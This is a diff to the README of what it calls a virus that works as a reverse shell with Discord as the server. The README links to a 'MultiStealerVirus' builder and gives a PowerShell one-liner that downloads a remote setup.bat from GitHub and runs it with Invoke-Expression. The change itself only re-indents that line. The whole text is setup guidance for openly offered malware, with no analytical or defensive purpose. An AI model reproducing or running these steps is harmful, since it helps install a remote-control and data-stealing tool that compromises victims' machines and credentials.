@@ -21,7 +21,8 @@ Virus in style of reverse shell whit discord as server
 1. Download builder [here](https://github.com/Josakko/MultiStealerVirus/releases/).
 
 2. Setup environment:
-  Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/setup.bat" -UseBasicParsing).Content
+
+       Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/setup.bat" -UseBasicParsing).Content
 
 ## Need Help?
 
